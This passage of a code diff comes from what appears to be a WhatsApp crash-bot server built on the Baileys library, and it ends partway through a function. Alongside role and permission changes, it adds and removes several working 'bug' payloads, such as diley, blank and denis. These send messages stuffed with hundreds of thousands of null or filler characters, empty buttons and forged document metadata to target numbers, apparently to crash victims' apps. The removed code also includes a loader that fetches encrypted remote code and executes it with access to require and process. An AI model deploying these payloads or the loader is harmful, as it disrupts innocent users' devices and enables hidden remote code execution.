+  const perms = loadDevicePerms();
+  perms[username.toLowerCase()] = {
+    approved: approved === true || approved === 'true',
+    allDevices: allDevices === true || allDevices === 'true',
+    devices: Array.isArray(devices) ? devices : []
+  };
+  saveDevicePerms(perms);
+  
+  return res.json({ valid: true, message: "Permission updated" });
+});
+
+app.get("/listDevicePerms", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.status(401).json({ valid: false });
+  const db = loadDatabase();
+  const requester = db.users.find(u => u.username === keyInfo.username);
+  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
+  const perms = loadDevicePerms();
+  return res.json({ valid: true, perms });
+});
+
+// --- TQ (Developer list) ---
+const tqto = config.TQTO;
+
+app.get("/tq", async (req, res) => {
+  res.json({ status: true, result: tqto });
+});
+
+// ===================== AKHIR TAMBAHAN =====================
+
 app.get("/getActiveSenders", (req, res) => {
   const { key } = req.query;
 
@@ -1219,10 +3017,10 @@ app.get("/getActiveSenders", (req, res) => {
   if (!keyInfo) return res.json({ valid: false, senders: [] });
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
+  const user = db.users.find(u => u.username === keyInfo.username);
   if (!user) return res.json({ valid: false, senders: [] });
 
-  if (!['owner', 'vip','admin'].includes(user.role)) {
+  if (!['creator', 'developer', 'owner', 'staf', 'exec', 'vvip', 'svip', 'ceo', 'mod', 'pt'].includes(user.role)) {
     return res.json({ valid: false, senders: [] });
   }
 
@@ -1285,12 +3083,12 @@ app.get("/mySender", (req, res) => {
   if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
+  const user = db.users.find(u => u.username === keyInfo.username);
   if (!user) return res.status(401).json({ error: "User not found" });
 
   let conns = [];
 
-  if (user.role === 'vip') {
+  if (['creator', 'developer', 'svip', 'vvip', 'exec', 'staf'].includes(user.role)) {
     console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);
 
     const vipPath = path.join(__dirname, 'vip');
@@ -1358,7 +3156,7 @@ app.get("/getPairing", async (req, res) => {
   if (!keyInfo) return res.json({ valid: false })
 
   const db = loadDatabase()
-  const user = db.find(u => u.username === keyInfo.username)
+  const user = db.users.find(u => u.username === keyInfo.username)
   if (!user) return res.status(401).json({ error: "Invalid session key" })
   if (!number) return res.status(400).json({ error: "Number is required" })
 
@@ -1377,7 +3175,7 @@ app.get("/getPairing", async (req, res) => {
     fs.mkdirSync(sessionDir, { recursive: true })
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
-    const { version } = await fetchLatestBaileysVersion()
+    const { version } = await fetchLatestBaileysVersion();
 
     const sock = makeWASocket({
       keepAliveIntervalMs: 50000,
@@ -1409,7 +3207,7 @@ app.get("/getPairing", async (req, res) => {
 
     if (!sock.authState.creds.registered) {
       await waiting(1200)
-      const code = await sock.requestPairingCode(number, "ORCALELO")
+      const code = await sock.requestPairingCode(number, "VEEXOORV")
       if (code) {
         return res.json({ valid: true, number, pairingCode: code })
       }
@@ -1433,18 +3231,24 @@ app.get("/createAccount", (req, res) => {
   }
 
   const db = loadDatabase();
-  const creator = db.find(u => u.username === keyInfo.username);
+  const creator = db.users.find(u => u.username === keyInfo.username);
 
-  if (!creator || !["reseller", "owner", "admin", "moderator", "partner"].includes(creator.role)) {
+  if (!creator || !["reseller", "owner", "staf", "exec", "vvip", "svip", "ceo", "mod", "pt", "developer", "creator"].includes(creator.role)) {
     console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
     return res.json({ valid: true, authorized: false, message: "Not authorized." });
   }
 
   const roleLimits = {
+    creator: 9999,
+    developer: 999,
+    staf: 999,
+    exec: 500,
+    vvip: 400,
+    svip: 300,
     owner: 50,
-    moderator: 45,
-    partner: 40,
-    admin: 35,
+    ceo: 45,
+    mod: 40,
+    pt: 35,
     reseller: 30
   };
 
@@ -1470,7 +3274,7 @@ app.get("/createAccount", (req, res) => {
     return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
   }
 
-  if (db.find(u => u.username === newUser)) {
+  if (db.users.find(u => u.username === newUser)) {
     console.log("[❌ CREATE] Username sudah digunakan.");
     return res.json({ valid: true, created: false, message: "Username already exists." });
   }
@@ -1482,10 +3286,10 @@ app.get("/createAccount", (req, res) => {
     username: newUser,
     password: pass,
     expiredDate: expired.toISOString().split("T")[0],
-    role: "member",
+    role: "full up",
   };
 
-  db.push(newAccount);
+  db.users.push(newAccount);
   creator.usageLog.count++;
   saveDatabase(db);
 
@@ -1514,46 +3318,34 @@ app.get("/deleteUser", (req, res) => {
   }
 
   const db = loadDatabase();
-  const deleter = db.find(u => u.username === keyInfo.username);
-  const targetUser = db.find(u => u.username === username);
+  const deleter = db.users.find(u => u.username === keyInfo.username);
+  const targetUser = db.users.find(u => u.username === username);
 
   if (!deleter || !targetUser) {
     return res.json({ valid: true, deleted: false, message: "User not found." });
   }
 
-  // Hanya owner yang bisa menghapus role owner
-  if (targetUser.role === 'owner' && deleter.role !== 'owner') {
+  if (targetUser.role === 'owner' && deleter.role !== 'owner' && deleter.role !== 'staf' && deleter.role !== 'exec' && deleter.role !== 'vvip' && deleter.role !== 'svip' && deleter.role !== 'developer' && deleter.role !== 'creator') {
     console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role owner.`);
     return res.json({ 
       valid: true, 
       authorized: false, 
-      message: "Only owner can delete another owner account." 
+      message: "Only owner, staf, exec, vvip, svip, developer, or creator can delete owner account." 
     });
   }
 
-  const roleLevel = {
-    owner: 6,
-    moderator: 5,
-    partner: 4,
-    admin: 3,
-    reseller: 2,
-    vip: 1,
-    member: 0
-  };
+  const deleterLevel = getRoleLevel(deleter.role);
+  const targetLevel = getRoleLevel(targetUser.role);
 
-  const deleterLevel = roleLevel[deleter.role] || 0;
-  const targetLevel = roleLevel[targetUser.role] || 0;
-
-  // Owner bisa hapus owner lain (level sama)
   if (deleterLevel < targetLevel) {
     console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
     return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
   }
 
-  const index = db.findIndex(u => u.username === username);
+  const index = db.users.findIndex(u => u.username === username);
   if (index !== -1) {
-    const deletedUser = db[index];
-    db.splice(index, 1);
+    const deletedUser = db.users[index];
+    db.users.splice(index, 1);
     saveDatabase(db);
 
     const logLine = `${deleter.username} Deleted ${username}\n`;
@@ -1581,17 +3373,17 @@ app.get("/listUsers", (req, res) => {
   }
 
   const db = loadDatabase();
-  const requester = db.find(u => u.username === keyInfo.username);
+  const requester = db.users.find(u => u.username === keyInfo.username);
 
-  if (!requester || !["owner", "moderator", "partner", "admin"].includes(requester.role)) {
+  if (!requester || !["creator", "developer", "owner", "staf", "exec", "vvip", "svip", "ceo", "mod", "pt"].includes(requester.role)) {
     console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
     return res.json({ valid: true, authorized: false, message: "Access denied." });
   }
 
-  const users = db.map(u => ({
+  const users = db.users.map(u => ({
     username: u.username,
     expiredDate: u.expiredDate,
-    role: u.role || "member",
+    role: u.role || "full up",
     parent: u.parent || "SYSTEM"
   }));
 
@@ -1606,36 +3398,36 @@ app.get("/userAdd", (req, res) => {
   if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
 
   const db = loadDatabase();
-  const creator = db.find(u => u.username === keyInfo.username);
+  const creator = db.users.find(u => u.username === keyInfo.username);
 
-  // HIERARKI ROLE - Owner BISA buat Owner
-  const hierarchy = {
-    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member', 'owner'], // ✅ Owner bisa buat owner
-    moderator: ['admin', 'partner', 'reseller', 'vip', 'member'],
-    partner: ['admin', 'reseller', 'vip', 'member'],
-    admin: ['reseller', 'vip', 'member']
-  };
+  const creatorRole = creator.role || "full up";
+  const targetRole = role || "full up";
 
-  const creatorRole = creator.role || "member";
-  const targetRole = role || "member";
-
-  if (!creator || !hierarchy[creatorRole]) {
+  if (!creator || !roleHierarchy[creatorRole]) {
     console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
     return res.json({ valid: true, authorized: false, message: "Not authorized." });
   }
 
-  // ✅ Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain
-
-  if (!hierarchy[creatorRole].includes(targetRole)) {
+  if (!canCreateRole(creatorRole, targetRole) && targetRole !== 'full up') {
     console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
     return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
   }
 
+  if (targetRole === 'full up' && creatorRole === 'full up') {
+    return res.json({ valid: true, authorized: false, message: "Full up cannot create accounts." });
+  }
+
   const roleLimits = {
+    creator: 9999,
+    developer: 999,
+    staf: 999,
+    exec: 500,
+    vvip: 400,
+    svip: 300,
     owner: 50,
-    moderator: 45,
-    partner: 40,
-    admin: 35,
+    ceo: 45,
+    mod: 40,
+    pt: 35,
     reseller: 30
   };
 
@@ -1656,7 +3448,7 @@ app.get("/userAdd", (req, res) => {
     });
   }
 
-  if (db.find(u => u.username === username)) {
+  if (db.users.find(u => u.username === username)) {
     console.log("[❌ USERADD] Username sudah ada.");
     return res.json({ valid: true, created: false, message: "Username already exists." });
   }
@@ -1671,7 +3463,7 @@ app.get("/userAdd", (req, res) => {
     expiredDate: expired.toISOString().split("T")[0],
   };
 
-  db.push(newUser);
+  db.users.push(newUser);
   creator.usageLog.count++;
   saveDatabase(db);
 
@@ -1689,10 +3481,10 @@ app.get("/editUser", (req, res) => {
   if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
 
   const db = loadDatabase();
-  const editor = db.find(u => u.username === keyInfo.username);
-  const targetUser = db.find(u => u.username === username);
+  const editor = db.users.find(u => u.username === keyInfo.username);
+  const targetUser = db.users.find(u => u.username === username);
 
-  if (!editor || !["reseller", "admin", "partner", "moderator", "owner"].includes(editor.role)) {
+  if (!editor || !["reseller", "staf", "exec", "vvip", "svip", "owner", "ceo", "mod", "pt", "developer", "creator"].includes(editor.role)) {
     console.log("[❌ EDIT] Tidak diizinkan.");
     return res.json({ valid: true, authorized: false, message: "Access denied." });
   }
@@ -1702,14 +3494,7 @@ app.get("/editUser", (req, res) => {
     return res.json({ valid: true, edited: false, message: "User not found." });
   }
 
-  // Owner bisa edit owner lain, hapus blok pengecekan khusus
-
-  const roleLevel = {
-    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
-  };
-  
-  // Owner bisa edit owner lain (level sama)
-  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
+  if (getRoleLevel(editor.role) < getRoleLevel(targetUser.role)) {
      return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
   }
 
@@ -1736,7 +3521,7 @@ app.get("/getLog", (req, res) => {
   if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
 
   const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
+  const user = db.users.find(u => u.username === keyInfo.username);
 
   if (!user || user.role !== "owner") {
     return res.json({ valid: true, authorized: false, message: "Access denied." });
@@ -1750,390 +3535,159 @@ app.get("/getLog", (req, res) => {
   }
 });
 
-const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';
-
-async function importFromRawEncrypted(url) {
-  try {
-    const { data } = await axios.get(url, { responseType: 'text' });
-    const [ivB64, encryptedB64] = data.trim().split('.');
-
-    const IV = Buffer.from(ivB64, 'base64');
-    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();
-
-    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
-    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
-    decrypted += decipher.final('utf8');
-
-    const context = {
-      module: { exports: {} },
-      require,
-      console,
-      process,
-      Buffer,
-      setTimeout,
-      setInterval,
-      clearInterval,
-      crypto,
-      proto,
-      generateWAMessageFromContent,
-      prepareWAMessageMedia,
-      generateWAMessageContent,
-      generateWAMessage,
-      waUploadToServer,
-      fs,
-      generateRandomMessageId
+// ========== BUG FUNCTIONS ==========
+async function diley(sock, target) {
+    const msg = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "lu ytim",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 500000 }, () => ({
+                        }))
+                    },
+                    viewOnceMessage: {
+                        message: {
+                            imageMessage: {
+                                url: "https://files.catbox.moe/rv38u5.jpg",
+                                mimetype: "image/jpeg",
+                                caption: "mampir",
+                                fileLength: "11887",
+                                height: 1080,
+                                width: 1080
+                            }
+                        }
+                    },
+                    extendedTextMessage: {
+                        text: "sumsel",
+                        title: "\u0000".repeat(300000),
+                        description: "\u3164".repeat(300000),
+                        previewType: "NONE"
+                    }
+                }
+            }
+        }
     };
 
-    const sandbox = vm.createContext(context);
-    sandbox.globalThis = sandbox;
-    sandbox.exports = sandbox.module.exports;
-
-    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
-    script.runInContext(sandbox);
-
-    return sandbox.module.exports;
-  } catch (err) {
-    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
-    return null;
-  }
+    await sock.relayMessage(target, msg, { participant: { jid: target } });
 }
 
-let bugWa;
-
-async function docthumb(sock, target) {
-  const pnx = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
-            documentMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
-              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-              fileLength: "1073741824000000",
-              pageCount: 9007199254740991 * 9999,
-              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-              fileName: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
-              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1723855952",
-              contactVcard: true,
-              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
-            },
-            hasMediaAttachment: true
-          },
-          body: {
-            text: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
-          },
-          contextInfo: {
-            remoteJid: "X",
-            participant: sock.user.id,
-            mentionedJid: [target, "13135550002@s.whatsapp.net",],
-            quotedMessage: {},
-          },
-          nativeFlowMessage: {
-            messageParamsJson: "{",
-            buttons: [
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  "icon": "REVIEW",
-                  "flow_cta": "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "\u0000".repeat(35000),
-                  "flow_message_version": "3"
-                })
-              },
-            ]
-          }
-        }
+async function GatauEfeknya(sock, target) {
+  const sange = {
+    interactiveMessage: {
+      body: {
+        text: "mklu gw ew" + "\u0000".repeat(90000)
       }
-    },
-    participant: { jid: target }
+    }
   };
 
-  const pnxMessage = generateWAMessageFromContent(
-    target,
-    proto.Message.fromObject(pnx),
-    {
-      userJid: target
-    }
-  );
-  await sock.relayMessage(target, pnxMessage.message,
-    {
-      messageId: pnxMessage.key.id
-    }
-  );
-}
-
-
-async function docthumbb(sock, target) {
-  await sock.relayMessage(target,
-    generateWAMessageFromContent(target,
-      proto.Message.fromObject({
-        viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              header: {
-                title: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
-                documentMessage: {
-                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-                  mimetype: "vsp/vaultsuperior",
-                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                  fileLength: "1073741824000000",
-                  pageCount: 9007199254740991 * 9999,
-                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                  fileName: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
-                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-                  mediaKeyTimestamp: "1723855952",
-                  contactVcard: true,
-                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
-                },
-                hasMediaAttachment: true
-              },
-              body: {
-                text: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(80000),
-              },
-              contextInfo: {
-                remoteJid: "X",
-                participant: sock.user.id,
-                mentionedJid: [target, "13135550002@s.whatsapp.net"],
-                quotedMessage: {},
-                isForwarded: true,
-                forwardingScore: 9999,
-                externalAdReply: {
-                  title: "🦋 .r4LdzHeLL¡!",
-                  body: "t.me/rraldz $$$ t.me/voidp",
-                  mediaType: "VIDEO",
-                  renderLargerThumbnail: false,
-                  containsAutoReply: true,
-                  showAdAttribution: true,
-                  thumbnail: { url: "https://files.catbox.moe/qh0oqq.jpg" },
-                },
-              },
-              nativeFlowMessage: {
-                messageParamsJson: "{",
-                buttons: [
-                  {
-                    name: "call_permission_request",
-                    buttonParamsJson: JSON.stringify({
-                      icon: "REVIEW",
-                      flow_cta: "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ‌ཀ‌‌🪅-‣" + "\u0000".repeat(60000),
-                                                                                                        
-                      flow_message_version: "3"
-                    })
-                  },
-                ]
-              }
-            }
-          }
-        }
-      }),
-      { userJid: target }
-    ).message,
-    {
-      messageId: generateWAMessageFromContent(
-        target,
-        proto.Message.fromObject({}),
-        { userJid: target }
-      ).key.id,
-    //  participant: { jid: target }
-    }
-  );
-}
-async function Adress(sock,target) {
-await sock.relayMessage("status@broadcast", {
-  interactiveResponseMessage: {
-   body: {
-     text: "N!ted °B!tch",
-     format: "EXTENSIONS_1"
-    },
-    nativeFlowResponseMessage: {
-     name: "address_message",
-     paramsJson: "\x10".repeat(2000),
-     version: 3
-    },
-   contextInfo: {
-    groupMentions: Array.from({ length: 2000 }, () => ({ //Besarin Aja Length nya
-     groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
-     groupSubject: "TheUciha"
-     }))
-   }
- }
-}, {
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: { status_setting: "contacts" },
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{
-          tag: "to",
-          attrs: { jid: target },
-          content: []
-        }]
-      }]
-    }]
-  })
-}
-
-async function botihunter(sock, target) {
-const msg2 = {
-   groupStatusMessageV2: {
-    message: {
-      interactiveMessage: {
-         body: {
-           text: "⿻ for Exfold ⿻"
-      },
-      NativeFlowMessage: {
-        buttons: [
-          "0@s.whatsapp.net",
-          ...Array.from(
-            { length: 19999999 },
-          )
-        ],
-        name: "\x10".repeat(50000)
-     },
-     nativeFlowMessage: {
-        name: "galaxy_message",
-        buttons: "\u0000".repeat(25000) + "\x10".repeat(25000)
-        }
-      }
-    }
-  }
-};
-await sock.relayMessage(target, msg2, {});
-}
-
-async function ofmEr(sock, target) {
-  await sock.relayMessage("status@broadcast", {
-    botInvokeMessage: {
-      message: {
-        messageContextInfo: {
-          messageSecret: crypto.randomBytes(32),
-          deviceListMetadata: {
-            senderKeyIndex: 0,
-            senderTimestamp: Date.now(),
-            recipientKeyIndex: 0
-          },
-          deviceListMetadataVersion: 2
-        },
-        interactiveResponseMessage: {
-          contextInfo: {
-            remoteJid: "status@broadcast",
-            fromMe: true,
-            forwardedAiBotMessageInfo: {
-              botJid: "13135550202@bot",
-              botName: "Business Assistant",
-              creator: "XzC - Expos3d"
-            },
-            statusAttributionType: 2,
-            statusAttributions: Array.from({ length: 1000000 }, (_, z) => ({
-              participant: `62${z + 720599}@s.whatsapp.net`,
-              type: 1
-            })),
-            participant: sock.user.id
-          },
-          body: {
-            text: "7eppeli.pdf",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "{ X: { status:true } }",
-            version: 3
-          }
-        }
+  const sange2 = {
+    interactiveMessage: {
+      body: {
+        text: "꧀".repeat(50000) + "\u0000".repeat(90000),
+        buttons: Array.from({ length: 500000 }, () => ({}))
       }
     }
-  }, {
-    statusJidList: [target],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: { status_setting: "contacts" },
-      content: [{
-        tag: "mentioned_users",
-        attrs: {},
-        content: [{
-          tag: "to",
-          attrs: { jid: target },
-          content: []
-        }]
-      }]
-    }]
-  })
-}
-async function iNTxSq(sock, target) {
-  for (let i = 0; i < 10; i++) {
-    await sock.relayMessage("status@broadcast",
-      {
-        interactiveResponseMessage: {
-          body: {
-            text: "\x10.r4LdzHeaven 👁‍🗨",
-            format: "EXTENSIONS_1"
-          },
-          nativeFlowResponseMessage: {
-            name: (["address_message","call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
-            paramsJson: "{".repeat(1),
-            version: 3
-          },
-          contextInfo: {
-            remoteJid: "@RaldzzXyz $$$ @voidp $$$ @rraldz",
-            urlTrackingMap: {
-              urlTrackingMapElements: Array.from(
-                { length: 200900 },
-                (_, r4LdzHeLL) => ({ type: 1 })
-              )
-            }
-          }
-        }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
-  }
-  await sleep(1000);
-}
+  };
 
-// pemanggilan
-async function lahora(sock, target) {
   try {
-    const msg1 = {
+    await sock.relayMessage(target, sange, {});
+    await sock.relayMessage(target, sange2, {});
+  } catch (error) {
+    console.error("Error sending messages:", error);
+  }
+}
+
+async function blank(sock, target) {
+await sock.relayMessage(target, {
+interactiveMessage: {
+body: {
+text: "Vexorv"
+},
+nativeFlowMessage: {
+buttons: "\u3164".repeat(500000)
+},
+},
+}, { participant: { jid: target }});
+}
+
+async function denis(sock, target) {
+  try {
+    const dens = {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
-            body: {
-              text: "kontol"
-            },
             nativeFlowMessage: {
-              buttons: "\0".repeat(250000)
+              buttons: [{
+                name: "galaxy_message",
+                buttonParamsJson: JSON.stringify({
+                  flow_message_version: "3",
+                  flow_token: JSON.stringify({
+                    ticket_id: "876444465502832" + "𑇂𑆵𑆴𑆿".repeat(1000)
+                  }),
+                  flow_id: "1850997912185503",
+                  flow_cta: "𑇂𑆵𑆴𑆿".repeat(5000) + "𑇂𑆵𑆴𑆿".repeat(5000),
+                  flow_action: "navigate",
+                  flow_action_payload: {
+                    screen: "SATISFACTION_SCREEN",
+                    data: {
+                      title: "𑲱".repeat(1000) + "𑲱".repeat(1000),
+                      continue_label: "𑜦𑜠".repeat(2000),
+                      satisfaction_screen_question: "ꦾ".repeat(3000),
+                      very_satisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
+                      slightly_satisfied_label: "𑜦𑜠".repeat(2000),
+                      neutral_label: "𑲱".repeat(2000),
+                      slightly_dissatisfied_label: "ꦾ".repeat(2000),
+                      very_dissatisfied_label: "𑇂𑆵𑆴𑆿".repeat(2000),
+                      helpfulness_screen_question: "𑲱".repeat(3000),
+                      very_helpful_label: "𑇂𑆵𑆴𑆿".repeat(2000),
+                      slightly_helpful_label: "𑜦𑜠".repeat(2000),
+                      slightly_unhelpful_label: "ꦾ".repeat(2000),
+                      very_unhelpful_label: "𑲱".repeat(2000),
+                      question_answered_screen_question: "𑇂𑆵𑆴𑆿".repeat(3000),
+                      yes_label: "𑲱".repeat(2000),
+                      no_label: "ꦾ".repeat(2000),
+                      improvement_suggestion_label: "𑇂𑆵𑆴𑆿".repeat(2000),
+                      submit_label: "𑜦𑜠".repeat(2000)
+                    }
+                  },
+                  flow_metadata: {
+                    flow_json_version: 700,
+                    data_api_protocol: null,
+                    data_api_version: null,
+                    flow_name: "𑇂𑆵𑆴𑆿".repeat(1000),
+                    creation_source: "CSAT",
+                    categories: []
+                  },
+                  icon: "DEFAULT",
+                  has_multiple_buttons: false
+                })
+              }]
+            }
+          }
+        }
+      }
+    };
+
